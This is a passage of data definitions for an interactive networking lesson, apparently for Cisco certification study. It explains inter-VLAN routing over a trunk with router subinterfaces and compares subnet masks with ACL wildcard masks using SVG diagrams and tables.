     {name:'Switch',tag:'layer 2',tone:'l3',note:'Removes the tag and sends the frame out the access port for PC-B',via:'Untagged, on an access port'},
     {name:'PC-B',tag:'VLAN 20 · 192.168.20.30',tone:'l3',note:'Receives a frame from the router’s MAC address'}
   ],{intro:'One cable between the switch and the router carries the packet twice: up to the router in VLAN 10, and back down in VLAN 20.',
     note:'<b>The subinterface number is a label.</b> Matching .10 to VLAN 10 is a convention; <code>encapsulation dot1q 10</code> is the command that binds the subinterface to the VLAN. The physical interface needs <code>no shutdown</code>, and the IP addresses go on the subinterfaces. A layer 3 switch does the same job internally with SVIs (<code>interface vlan 10</code>) and <code>ip routing</code>.',
     key:[['l1','VLAN 10 side'],['l3','VLAN 20 side'],['l4','The router: layer 3']],
     caption:'The router turns a VLAN 10 frame into a VLAN 20 frame; the trunk carries both directions.',
     bloom:'Apply'}),
   COMPARE('Subnet mask and wildcard mask: the same /24, written two ways',[
     {name:'Subnet mask',tag:'with the prefix length',tone:'l2',
      svg:{label:'A /24 subnet mask: three octets of ones mark the network, and one octet of zeros marks the host part. In decimal, 255.255.255.0.',
       body:'<g font-family="monospace" font-size="8.5" text-anchor="middle" fill="var(--ink)"><rect x="2" y="6" width="47" height="20" rx="3" fill="var(--tint2)" stroke="var(--l2)" stroke-width="1.5"/><text x="25.5" y="20">11111111</text><rect x="51" y="6" width="47" height="20" rx="3" fill="var(--tint2)" stroke="var(--l2)" stroke-width="1.5"/><text x="74.5" y="20">11111111</text><rect x="100" y="6" width="47" height="20" rx="3" fill="var(--tint2)" stroke="var(--l2)" stroke-width="1.5"/><text x="123.5" y="20">11111111</text><rect x="149" y="6" width="47" height="20" rx="3" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="1.5"/><text x="172.5" y="20">00000000</text></g><g font-size="11" text-anchor="middle" fill="var(--ink)"><text x="25.5" y="42">255</text><text x="74.5" y="42">255</text><text x="123.5" y="42">255</text><text x="172.5" y="42">0</text></g><path d="M2 52 H147 M149 52 H196" fill="none" stroke="var(--ink-3)" stroke-width="1.5"/><g font-size="9" text-anchor="middle" fill="var(--ink-2)"><text x="74.5" y="66">network: 24 ones (/24)</text><text x="172.5" y="66">host</text></g>'},
      rows:[['Written on','Interfaces and hosts: <code>ip address</code> lines'],
            ['A 1 bit means','Part of the network'],
            ['A 0 bit means','Part of the host'],
            ['/24','<code>255.255.255.0</code>'],
            ['/26','<code>255.255.255.192</code>']],
      hook:'the ones mark the network.'},
     {name:'Wildcard mask',tag:'in ACLs and OSPF',tone:'l3',
      svg:{label:'A /24 wildcard mask: three octets of zeros must match, and one octet of ones is ignored. In decimal, 0.0.0.255.',
       body:'<g font-family="monospace" font-size="8.5" text-anchor="middle" fill="var(--ink)"><rect x="2" y="6" width="47" height="20" rx="3" fill="var(--tint3)" stroke="var(--l3)" stroke-width="1.5"/><text x="25.5" y="20">00000000</text><rect x="51" y="6" width="47" height="20" rx="3" fill="var(--tint3)" stroke="var(--l3)" stroke-width="1.5"/><text x="74.5" y="20">00000000</text><rect x="100" y="6" width="47" height="20" rx="3" fill="var(--tint3)" stroke="var(--l3)" stroke-width="1.5"/><text x="123.5" y="20">00000000</text><rect x="149" y="6" width="47" height="20" rx="3" fill="var(--paper)" stroke="var(--ink-3)" stroke-width="1.5" stroke-dasharray="3 2"/><text x="172.5" y="20">11111111</text></g><g font-size="11" text-anchor="middle" fill="var(--ink)"><text x="25.5" y="42">0</text><text x="74.5" y="42">0</text><text x="123.5" y="42">0</text><text x="172.5" y="42">255</text></g><path d="M2 52 H147 M149 52 H196" fill="none" stroke="var(--ink-3)" stroke-width="1.5"/><g font-size="9" text-anchor="middle" fill="var(--ink-2)"><text x="74.5" y="66">must match</text><text x="172.5" y="66">ignore</text></g>'},
      rows:[['Written in','ACL lines: <code>permit 192.168.10.0 0.0.0.255</code>'],
            ['A 0 bit means','Must match the address given'],
            ['A 1 bit means','Ignore: any value passes'],
            ['/24','<code>0.0.0.255</code>'],
            ['/26','<code>0.0.0.63</code>']],
